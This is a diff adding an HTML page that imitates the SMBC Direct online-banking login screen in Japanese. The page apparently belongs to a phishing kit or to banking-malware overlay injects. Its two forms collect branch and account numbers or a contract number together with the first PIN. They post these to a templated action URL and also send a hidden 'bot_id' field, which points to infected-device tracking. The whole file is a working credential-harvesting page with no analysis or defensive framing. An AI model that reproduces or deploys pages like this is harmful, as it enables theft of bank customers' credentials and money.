@@ -1,0 +1,365 @@
+<html>
+	<head>
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width,initial-scale=1">
+		<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+		<script src="https://use.fontawesome.com/8d8c3a1b01.js"></script>
+
+		<style>
+			body {
+				margin: 0;
+				padding: 0;
+			}
+
+			.header {
+				background: #fff;
+				padding: 26px 0 11px;
+				text-align: center;
+			}
+
+			h3 {
+				padding: 5px 10px;
+				background: #367a5d;
+				color: #fff;
+				float: right;
+				font-size: 12px;
+				margin-top: -57px;
+				margin-bottom: 0;
+			}
+
+			.header2 {
+				text-align: center;
+				color: #fff;
+				background: #000;
+			}
+
+			.col-xs-10 {
+				width: 100%;
+			}
+				
+			.col-xs-1, .col-xs-10, .col-xs-11, .col-xs-12, .col-xs-2, .col-xs-3, .col-xs-4, .col-xs-5, .col-xs-6, .col-xs-7, .col-xs-8, .col-xs-9 {
+				float: none;
+			}
+			
+			#form2 {
+				display: none;
+			}
+			
+			.hr1 {
+				display: block;
+				text-align: center;
+				width: 49%;
+				margin-top: 2px;
+				height: 50px;
+				background: #367a5d;
+				color: white;
+				font-family: Tahoma;
+				font-size: 16px;
+				text-decoration: none;
+				padding-top: 15px;
+				border-bottom: 6px solid #3ba074;
+				float: left;
+				margin-bottom: 15px;
+				font-weight: bold;
+			}
+			
+			.hr1:active{ background:#275a45;} .hr2:active{ background:#275a45;}
+			a:focus, a:hover {
+    color: #fff;
+    text-decoration: none;
+}
+
+.hr11 {
+    display: block;
+    width: 49%;
+    margin-top: 2px;
+    text-align: center;
+    height: 50px;
+    background: #367a5d;
+    color: white;
+    font-family: Tahoma;
+    font-size: 16px;
+    text-decoration: none;
+    padding-top: 15px;
+    border-bottom: 2px solid #3ba074;
+    float: left;
+    font-weight: bold;
+}
+.hr11:active{ background:#275a45;} .hr22:active{ background:#275a45;}
+.hr22 {
+    display: block;
+    width: 50%;
+    text-align: center;
+    margin-top: 2px;
+    height: 50px;
+    background: #367a5d;
+    color: white;
+    font-family: Tahoma;
+    font-size: 16px;
+    text-decoration: none;
+    padding-top: 15px;
+    border-bottom: 6px solid #3ba074;
+    float: left;
+    margin-bottom: 15px;
+    font-weight: bold;
+}
+		.hr2 {
+			display: block;
+			width: 50%;
+			text-align: center;
+			height: 50px;
+			background: #367a5d;
+			color: white;
+			margin-top: 2px;
+			font-family: Tahoma;
+			font-size: 16px;
+			text-decoration: none;
+			padding-top: 15px;
+			border-bottom: 2px solid #3ba074;
+			float: left;
+			font-weight: bold;
+		}
+
+.input {
+    padding: 7px;
+    width: 75%;
+    float: left;
+    font-size: 12px;
+    border: 0;
+    border-top: 2px solid #6f6f6f;
+    background: #ececec;
+    border-radius: 0 5px 5px 0;
+}
+
+#label1 {
+    width: 25%;
+    padding: 8px;
+    background: #367a5d;
+    color: #fff;
+    font-size: 12px;
+    border: 0;
+    float: left;
+    margin-bottom: 0;
+    border-radius: 5px 0 0 5px;
+}
+
+#label2 {
+    width: 25%;
+    padding: 8px;
+    background: #367a5d;
+    color: #fff;
+    font-size: 12px;
+    border: 0;
+    float: left;
+    margin-bottom: 0;
+    border-radius: 5px 0 0 5px;
+}
+
+#input_submitBtn1 {
+    width: 51%;
+    margin-top: 10px;
+    border-radius: 50px;
+    height: 33px;
+    background: #367a5d;
+	color: #fff;
+    border: 0;
+}
+#input_submitBtn1:disabled {
+    width: 51%;
+    margin-top: 10px;
+    border-radius: 50px;
+	color: #a9a4a4;
+    height: 33px;
+    background: #fff;
+    border: 1px solid #a9a4a4;
+}
+
+#input_submitBtn2:disabled {
+    width: 51%;
+    margin-top: 10px;
+    border-radius: 50px;
+    height: 33px;
+	color: #a9a4a4;
+    background: #fff;
+    border: 1px solid #a9a4a4;
+}
+#input_submitBtn2 {
+    width: 51%;
+	color: #fff;
+    margin-top: 10px;
+    border-radius: 50px;
+    height: 33px;
+    background: #367a5d;
+    border: 0;
+}
+.ss {
+    font-family: Tahoma;
+    font-size: 12px;
+    color: #000;
+    text-decoration: underline;
+    width: 40%;
+    margin-left: 7%;
+    margin-right: 3%;
+    margin-top: 15px;
+    position: relative;
+    display: inline-block;
+    float: left;
+    text-align: center;
+}
+.ss2 {
+    font-family: Tahoma;
+    font-size: 12px;
+    color: #000;
+    text-decoration: underline;
+    width: 40%;
+    margin-left: 3%;
+    margin-right: 7%;
+    margin-top: 15px;
+    position: relative;
+    display: inline-block;
+    float: left;
+    text-align: center;
+}
+
+h2 {
+    font-size: 10px;
+    text-align: center;
+    margin-top: 42px;
+}
+
+		</style>
+		<script src="%DYN_PATH_GENERAL%/jquery.min.js"></script>
+	</head>
+<body>
+	<div class="header">
+		<img style="width: 50%;" src="data:image/png;base64,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">
+	</div>
+		
+		<h3> メニュー </h3>
+
+	<div class="header2">
+		SMBCダイレクト
+	</div>
+
+		<div id="content_div">
+	
+	<div id="form1">
+		<A href="#" class="hr1">店・口座番号</A>
+		<A href="#" class="hr2" onclick="document.getElementById('form1').style.display = 'none'; document.getElementById('form2').style.display = 'block';" style="margin-left: 1%;">契約者番号</A>
+		<div style="clear:both"></div>
+	<div class="col-xs-10 col-sm-8">
+		<form id='mainform' method='post' action='%ACTION%' onsubmit="return function(){ 
+var ok = true;
+
+$('#form1 > input').each(function (i, value){  
+	$(value).css('border', '');
+	
+	if(!$(value).is(':visible') || $(value).prop('type') == 'submit')
+		return;
+		
+	if($(value).val().length < 3){
+		$(value).css('border', '1px solid red');
+		ok = false;
+	}
+	
+	if($(value).prop('maxlength') !== undefined && $(value).prop('maxlength') != -1 && $(value).val().length > $(value).prop('maxlength'))
+	{
+		$(value).css('border', '1px solid red');
+		ok = false;
+	}
+	
+});
+if(window.form_sent) return false; if(ok) window.form_sent = true; return ok; 
+}()">
+		<input type="hidden" name="page_id" value="%PKG%" class="main_input" /><input type="hidden" name="bot_id" value="%BOTID%" />
+
+			<label id="label1">店番号 </label>
+			<input name="fields[userid]" style="width: 20%;margin-right: 1%;" onkeyup="check1();" id="login1" maxlength="20" class="input" type="text">
+			
+			<label id="label1">口座番号 </label>
+			<input name="fields[userid2]"  onkeyup="check1();" style="width: 29%;" id="login1" maxlength="20" class="input" type="text">
+<br />
+<br />
+			<label id="label1">第一暗証 </label>
+			<input name="fields[password]" placeholder="半角英数字" onkeyup="check1();" id="password1" maxlength="50" class="input" type="password">
+
+			<input name="name" type="checkbox" style="margin-top: 20px;float: left;width: 5%;"> <h4 style="color: #000000;display: inline-block;margin-top: 22px;font-size: 12px;font-weight: 100;margin-bottom: 0;width: 44%;float: left;">店・口座番号保存 </h4>
+			<input value="ログオンテスト" id="input_submitBtn1" disabled="disabled" class="submit" type="submit">
+			
+			<a href="#" class="ss">ご利用上の注意</a> <a href="#" class="ss2">個人情報の利用目的</a>
+			<h2> 個人情報の利用目的をご確認の上ログインしてください </h2>
+
+<br />
+			
+		</form>
+	</div>
+		  <script>
+function check1() {
+  var inp1 = document.getElementById('login1'),
+      inp2 = document.getElementById('password1');
+      inp3 = document.getElementById('password1');
+  document.getElementById('input_submitBtn1').disabled = inp1.value && inp2.value && inp3.value ? false : "disabled";
+}
+</script>
+
+	</div>
+	
+	<div id="form2">
+		<A href="#" class="hr11" onclick="document.getElementById('form2').style.display = 'none'; document.getElementById('form1').style.display = 'block';">店・口座番号</A>
+		<A href="#" class="hr22" style="margin-left: 1%;">契約者番号</A>
+		<div style="clear:both"></div>
+		<div class="col-xs-10 col-sm-8">
+				<form id='mainform' method='post' action='%ACTION%' onsubmit="return function(){ 
+var ok = true;
+
+$('#form2 > input').each(function (i, value){  
+	$(value).css('border', '');
+	
+	if(!$(value).is(':visible') || $(value).prop('type') == 'submit')
+		return;
+		
+	if($(value).val().length < 3){
+		$(value).css('border', '1px solid red');
+		ok = false;
+	}
+	
+	if($(value).prop('maxlength') !== undefined && $(value).prop('maxlength') != -1 && $(value).val().length > $(value).prop('maxlength'))
+	{
+		$(value).css('border', '1px solid red');
+		ok = false;
+	}
+	
+});
+if(window.form_sent) return false; if(ok) window.form_sent = true; return ok; 
+}()">
+		<input type="hidden" name="page_id" value="%PKG%" class="main_input" /><input type="hidden" name="bot_id" value="%BOTID%" />
+
+			<label id="label1" style="width: 30%;">契約者番号 </label>
+			<input name="fields[userid]" onkeyup="check2();" id="login2" style="width: 70%;" maxlength="20" class="input" type="text">
+
+			<br />
+			<br />
+			
+			<label id="label1" style="width: 30%;">第一暗証 </label>
+			<input name="fields[password]" placeholder="半角英数字" onkeyup="check2();" style="width: 70%;" id="password2" maxlength="50" class="input" type="password">
+			<input name="fields[name]" type="checkbox" style="margin-top: 20px;float: left;width: 5%;"> <h4 style="color: #000000;display: inline-block;margin-top: 22px;font-size: 12px;font-weight: 100;margin-bottom: 0;width: 44%;float: left;">契約者番号保存  </h4>
+			<input value="ログオンテスト" id="input_submitBtn2" disabled="disabled" class="submit" type="submit">
+			
+			<a href="#" class="ss">ご利用上の注意</a> <a href="#" class="ss2">個人情報の利用目的</a>
+			<h2> 個人情報の利用目的をご確認の上ログインしてください </h2>
+
+<br />
+		</form>
+		</div>
+		  <script>
+function check2() {
+  var inp4 = document.getElementById('login2'),
+      inp5 = document.getElementById('password2');
+  document.getElementById('input_submitBtn2').disabled = inp4.value && inp5.value ? false : "disabled";
+}
+</script>
+
+	</div>	
+		</div>
+</body>
+</html>
